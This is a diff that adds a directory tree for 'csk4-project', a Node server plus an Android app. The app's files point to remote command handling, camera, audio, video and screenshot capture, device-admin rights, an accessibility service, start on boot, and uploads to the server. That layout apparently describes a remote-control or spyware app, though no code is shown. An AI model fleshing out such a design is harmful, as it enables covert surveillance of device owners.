@@ -1,0 +1,66 @@
+csk4-project/
+│
+├── server/
+│   ├── server.js
+│   ├── package.json
+│   ├── render.yaml
+│   ├── .gitignore
+│   ├── uploads/                  (auto-create)
+│   └── public/
+│       ├── index.html
+│       ├── style.css
+│       ├── app.js
+│       └── webrtc.js
+│
+└── android-app/
+    ├── build.gradle
+    ├── settings.gradle
+    ├── gradle.properties
+    ├── gradlew
+    ├── gradlew.bat
+    ├── gradle/wrapper/
+    │   ├── gradle-wrapper.jar
+    │   └── gradle-wrapper.properties
+    ├── app/
+    │   ├── build.gradle
+    │   ├── proguard-rules.pro
+    │   └── src/main/
+    │       ├── AndroidManifest.xml
+    │       ├── java/com/csk4/app/
+    │       │   ├── Config.kt
+    │       │   ├── SplashActivity.kt
+    │       │   ├── PermissionActivity.kt
+    │       │   ├── LoginActivity.kt
+    │       │   ├── MainActivity.kt
+    │       │   ├── WebViewActivity.kt
+    │       │   ├── CommandService.kt
+    │       │   ├── CommandHandler.kt
+    │       │   ├── CameraController.kt
+    │       │   ├── VideoRecorder.kt
+    │       │   ├── AudioRecorder.kt
+    │       │   ├── ScreenshotService.kt
+    │       │   ├── DeviceAdminReceiver.kt
+    │       │   ├── BluetoothScanner.kt
+    │       │   ├── WebRTCService.kt
+    │       │   ├── SimpleSdpObserver.kt
+    │       │   ├── VolleyMultipartRequest.kt
+    │       │   └── BootReceiver.kt
+    │       └── res/
+    │           ├── layout/
+    │           │   ├── activity_splash.xml
+    │           │   ├── activity_permission.xml
+    │           │   ├── activity_login.xml
+    │           │   ├── activity_main.xml
+    │           │   └── activity_webview.xml
+    │           ├── values/
+    │           │   ├── strings.xml
+    │           │   ├── colors.xml
+    │           │   └── themes.xml
+    │           ├── xml/
+    │           │   ├── network_security_config.xml
+    │           │   ├── device_admin.xml
+    │           │   └── accessibility_service_config.xml
+    │           └── mipmap-hdpi/
+    │               └── ic_launcher.png (Android Studio auto-generate)
+    │
+    └── (Android Studio baaki icon files khud bana dega)
